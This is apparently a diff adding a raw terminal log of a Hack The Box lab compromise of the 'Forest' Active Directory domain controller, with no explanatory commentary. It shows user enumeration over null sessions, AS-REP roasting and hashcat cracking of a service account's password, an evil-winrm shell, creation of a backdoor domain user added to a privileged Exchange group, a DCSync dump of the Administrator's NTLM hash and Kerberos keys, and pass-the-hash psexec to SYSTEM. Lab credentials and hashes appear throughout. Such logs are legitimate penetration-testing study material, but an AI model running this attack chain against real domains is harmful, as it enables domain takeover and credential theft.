@@ -1,0 +1,612 @@
+						FOREST ACTIVE DIRECROY MACHINE 
+nmap -Pn -open -sC -sV -p- -T4 x.x.x.x
+
+ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.77 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -sC -sV -p$ports 10.129.1.77
+
+
+
+
+
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# ports=$(nmap -p- --min-rate=1000 -T4 10.129.241.165 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -sC -sV -p$ports 10.129.241.165
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 03:30 EDT
+Nmap scan report for forest.htb (10.129.241.165)
+Host is up (0.26s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-19 07:37:52Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49681/tcp open  msrpc        Microsoft Windows RPC
+49698/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m51s, deviation: 4h02m31s, median: 6m50s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-03-19T00:38:51-07:00
+| smb2-time: 
+|   date: 2023-03-19T07:38:52
+|_  start_date: 2023-03-19T07:33:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.04 seconds
+                                                                                         
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# smbclient -L \\\\10.129.241.165
+Password for [WORKGROUP\root]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.241.165 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# nullinux 10.129.241.165
+
+    Starting nullinux v5.5.0dev | 03-19-2023 03:30
+
+
+
+[*] Enumerating Shares for: 10.129.241.165
+        Shares                     Comments
+   -------------------------------------------
+   
+[-] No Shares Detected
+
+[*] Enumerating Domain Information for: 10.129.241.165
+[+] Domain Name: HTB
+[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
+
+[*] Enumerating querydispinfo for: 10.129.241.165
+    $331000-VK4ADACQNUCA
+    Administrator
+    andy
+    DefaultAccount
+    Guest
+    HealthMailbox0659cc1
+    HealthMailbox670628e
+    HealthMailbox6ded678
+    HealthMailbox7108a4e
+    HealthMailbox83d6781
+    HealthMailbox968e74d
+    HealthMailboxb01ac64
+    HealthMailboxc0a90c9
+    HealthMailboxc3d7722
+    HealthMailboxfc9daad
+    HealthMailboxfd87238
+    krbtgt
+    lucinda
+    mark
+    santi
+    sebastien
+    SM_1b41c9286325456bb
+    SM_1ffab36a2f5f479cb
+    SM_2c8eef0a09b545acb
+    SM_681f53d4942840e18
+    SM_75a538d3025e4db9a
+    SM_7c96b981967141ebb
+    SM_9b69f1b9d2cc45549
+    SM_c75ee099d0a64c91b
+    SM_ca8c2ed5bdab4dc9b
+    svc-alfresco
+
+[*] Enumerating enumdomusers for: 10.129.241.165
+    Administrator
+    Guest
+    krbtgt
+    DefaultAccount
+    $331000-VK4ADACQNUCA
+    SM_2c8eef0a09b545acb
+    SM_ca8c2ed5bdab4dc9b
+    SM_75a538d3025e4db9a
+    SM_681f53d4942840e18
+    SM_1b41c9286325456bb
+    SM_9b69f1b9d2cc45549
+    SM_7c96b981967141ebb
+    SM_c75ee099d0a64c91b
+    SM_1ffab36a2f5f479cb
+    HealthMailboxc3d7722
+    HealthMailboxfc9daad
+    HealthMailboxc0a90c9
+    HealthMailbox670628e
+    HealthMailbox968e74d
+    HealthMailbox6ded678
+    HealthMailbox83d6781
+    HealthMailboxfd87238
+    HealthMailboxb01ac64
+    HealthMailbox7108a4e
+    HealthMailbox0659cc1
+    sebastien
+    lucinda
+    svc-alfresco
+    andy
+    mark
+    santi
+
+[*] Enumerating LSA for: 10.129.241.165
+
+[*] Performing RID Cycling for: 10.129.241.165
+/usr/local/bin/nullinux:241: DeprecationWarning: activeCount() is deprecated, use active_count() instead
+  while activeCount() > max_threads:
+/usr/local/bin/nullinux:243: DeprecationWarning: activeCount() is deprecated, use active_count() instead
+  while activeCount() > 1:
+
+[*] Testing 10.129.241.165 for Known Users
+
+[*] Enumerating Group Memberships for: 10.129.241.165
+[+] Group: Enterprise Read-only Domain Controllers
+[+] Group: Domain Admins
+    Administrator
+[+] Group: Domain Users
+    Administrator
+    DefaultAccount
+    krbtgt
+    $331000-VK4ADACQNUCA
+    SM_2c8eef0a09b545acb
+    SM_ca8c2ed5bdab4dc9b
+    SM_75a538d3025e4db9a
+    SM_681f53d4942840e18
+    SM_1b41c9286325456bb
+    SM_9b69f1b9d2cc45549
+    SM_7c96b981967141ebb
+    SM_c75ee099d0a64c91b
+    SM_1ffab36a2f5f479cb
+    HealthMailboxc3d7722
+    HealthMailboxfc9daad
+    HealthMailboxc0a90c9
+    HealthMailbox670628e
+    HealthMailbox968e74d
+    HealthMailbox6ded678
+    HealthMailbox83d6781
+    HealthMailboxfd87238
+    HealthMailboxb01ac64
+    HealthMailbox7108a4e
+    HealthMailbox0659cc1
+    sebastien
+    lucinda
+    svc-alfresco
+    andy
+    mark
+    santi
+[+] Group: Domain Guests
+    Guest
+[+] Group: Domain Computers
+    EXCH01$
+[+] Group: Domain Controllers
+    FOREST$
+[+] Group: Schema Admins
+    Administrator
+[+] Group: Enterprise Admins
+    Administrator
+[+] Group: Group Policy Creator Owners
+    Administrator
+[+] Group: Read-only Domain Controllers
+[+] Group: Cloneable Domain Controllers
+[+] Group: Protected Users
+[+] Group: Key Admins
+[+] Group: Enterprise Key Admins
+[+] Group: DnsUpdateProxy
+[+] Group: Organization Management
+    Administrator
+[+] Group: Recipient Management
+[+] Group: View-Only Organization Management
+[+] Group: Public Folder Management
+[+] Group: UM Management
+[+] Group: Help Desk
+[+] Group: Records Management
+[+] Group: Discovery Management
+[+] Group: Server Management
+[+] Group: Delegated Setup
+[+] Group: Hygiene Management
+[+] Group: Compliance Management
+[+] Group: Security Reader
+[+] Group: Security Administrator
+[+] Group: Exchange Servers
+    EXCH01$
+    $D31000-NSEL5BRJ63V7
+[+] Group: Exchange Trusted Subsystem
+    EXCH01$
+[+] Group: Managed Availability Servers
+    EXCH01$
+    Exchange Servers
+[+] Group: Exchange Windows Permissions
+    Exchange Trusted Subsystem
+[+] Group: ExchangeLegacyInterop
+[+] Group: $D31000-NSEL5BRJ63V7
+    EXCH01$
+[+] Group: Service Accounts
+    svc-alfresco
+[+] Group: Privileged IT Accounts
+    Service Accounts
+[+] Group: test
+
+[*] 37 unique user(s) identified
+[+] Writing users to file: ./nullinux_users.txt
+
+                                                                                     
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# rpcclient 10.129.241.165 -U '' -N
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+rpcclient $> queryusergroups 0x47b
+        group rid:[0x201] attr:[0x7]
+        group rid:[0x47c] attr:[0x7]
+rpcclient $> querygroup 0x47c
+        Group Name:     Service Accounts
+        Description:
+        Group Attribute:7
+        Num Members:1
+rpcclient $> querygroup 0x201
+        Group Name:     Domain Users
+        Description:    All domain users
+        Group Attribute:7
+        Num Members:30
+rpcclient $> exit
+                                                                             
+
+
+
+===============================================
+USERS :  
+
+Administrator
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+
+=============================================
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# impacket-GetNPUsers -dc-ip 10.129.241.165 -request 'htb.local/' -format hashcat
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-03-19 03:40:06.655678  2019-09-23 07:09:47.931194  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:2553c70d7abed1e2bafce233a55863dd$83d87eaff7272fc25bb0c1c16a5a4fb23693c7ef24c3ad2507aaae64f9733efcc732ca532eddbec676d7dab35f468c0acab0d2891ede5ed3a6345799df6c4f7c6d7a55cfc64f10d041574aa6645f57834864ef9f0476452fa256cbc94d29c371a9089789f62a61cd43ca134fa01dd5872f4fab2b2d432fbfde937c8c4e58287cbdf1419b24a728a6b580ee7519d118da9b93d4799ca68af825e86c5051cf2c959093b08d29dbd48a36f29b9ff6acf1395d77b7f52f307e8ca2a9f8815e79ff9f93984093be49ddcbff4339e3807f19be57b5b970e1b1734b309327fd1c7bf8d49a3f917ba85a
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# nano hash           
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-Intel(R) Core(TM) i3-1005G1 CPU @ 1.20GHz, 3919/7902 MB (1024 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 3234
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 46389741090
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:2553c70d7abed1e2bafce233a55863dd$83d87eaff7272fc25bb0c1c16a5a4fb23693c7ef24c3ad2507aaae64f9733efcc732ca532eddbec676d7dab35f468c0acab0d2891ede5ed3a6345799df6c4f7c6d7a55cfc64f10d041574aa6645f57834864ef9f0476452fa256cbc94d29c371a9089789f62a61cd43ca134fa01dd5872f4fab2b2d432fbfde937c8c4e58287cbdf1419b24a728a6b580ee7519d118da9b93d4799ca68af825e86c5051cf2c959093b08d29dbd48a36f29b9ff6acf1395d77b7f52f307e8ca2a9f8815e79ff9f93984093be49ddcbff4339e3807f19be57b5b970e1b1734b309327fd1c7bf8d49a3f917ba85a:s3rvice
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:2553c70d7abed1...7ba85a
+Time.Started.....: Sun Mar 19 03:35:51 2023 (35 secs)
+Time.Estimated...: Sun Mar 19 03:36:26 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   843.3 kH/s (10.33ms) @ Accel:128 Loops:32 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 29197824/46389741090 (0.06%)
+Rejected.........: 0/29197824 (0.00%)
+Restore.Point....: 8960/14344385 (0.06%)
+Restore.Sub.#1...: Salt:0 Amplifier:832-864 Iteration:0-32
+Candidate.Engine.: Device Generator
+Candidates.#1....: 01010.6 -> s8ssy123
+Hardware.Mon.#1..: Util: 98%
+
+Started: Sun Mar 19 03:35:46 2023
+Stopped: Sun Mar 19 03:36:28 2023
+                                                                               
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# evil-winrm -i 10.129.241.165 -u svc-alfresco -p s3rvice
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group /domain
+
+Group Accounts for \\
+
+-------------------------------------------------------------------------------
+*$D31000-NSEL5BRJ63V7
+*Cloneable Domain Controllers
+*Compliance Management
+*Delegated Setup
+*Discovery Management
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Key Admins
+*Enterprise Read-only Domain Controllers
+*Exchange Servers
+*Exchange Trusted Subsystem
+*Exchange Windows Permissions
+*ExchangeLegacyInterop
+*Group Policy Creator Owners
+*Help Desk
+*Hygiene Management
+*Key Admins
+*Managed Availability Servers
+*Organization Management
+*Privileged IT Accounts
+*Protected Users
+*Public Folder Management
+*Read-only Domain Controllers
+*Recipient Management
+*Records Management
+*Schema Admins
+*Security Administrator
+*Security Reader
+*Server Management
+*Service Accounts
+*test
+*UM Management
+*View-Only Organization Management
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /domain
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+$331000-VK4ADACQNUCA     Administrator            andy
+DefaultAccount           Guest                    HealthMailbox0659cc1
+HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
+HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
+HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
+HealthMailboxfd87238     john                     krbtgt
+lucinda                  mark                     santi
+sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
+SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
+SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
+SM_ca8c2ed5bdab4dc9b     svc-alfresco
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user bigb0ss bigb0ss /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Trusted Subsystem" bigb0ss /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user bigb0ss /domain
+User name                    bigb0ss
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            3/19/2023 1:38:54 AM
+Password expires             Never
+Password changeable          3/20/2023 1:38:54 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Exchange Trusted Subs
+The command completed successfully.
+
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# impacket-secretsdump htb.local/bigb0ss:bigb0ss@10.129.241.165 -just-dc-user administrator
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+[*] Cleaning up... 
+
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/forest]
+└─# impacket-psexec htb.local/administrator@10.129.241.165 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.241.165.....
+[*] Found writable share ADMIN$
+[*] Uploading file EtavgVuc.exe
+[*] Opening SVCManager on 10.129.241.165.....
+[*] Creating service vNSH on 10.129.241.165.....
+[*] Starting service vNSH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> cd /
+ 
+C:\> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 61F2-A88F
+
+ Directory of C:\
+
+09/20/2019  01:18 PM    <DIR>          PerfLogs
+09/22/2019  04:56 PM    <DIR>          Program Files
+11/20/2016  07:36 PM    <DIR>          Program Files (x86)
+09/22/2019  04:02 PM    <DIR>          Users
+03/19/2023  01:47 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  10,434,871,296 bytes free
+
+C:\> cd Users
+ 
+C:\Users> cd Administrator
+ 
+C:\Users\Administrator> cd Desktop
+ 
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 61F2-A88F
+
+ Directory of C:\Users\Administrator\Desktop
+
+09/23/2019  02:15 PM    <DIR>          .
+09/23/2019  02:15 PM    <DIR>          ..
+03/19/2023  12:34 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  10,434,871,296 bytes free
+ty
+peC:\Users\Administrator\Deskttype root.txt
+8b73d80af9778c61de888e88640a2c59
+
+C:\Users\Administrator\Desktop> exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on 10.129.241.165.....
+[*] Stopping service vNSH.....
+[*] Removing service vNSH.....
+[*] Removing file EtavgVuc.exe.....
+                                                                        
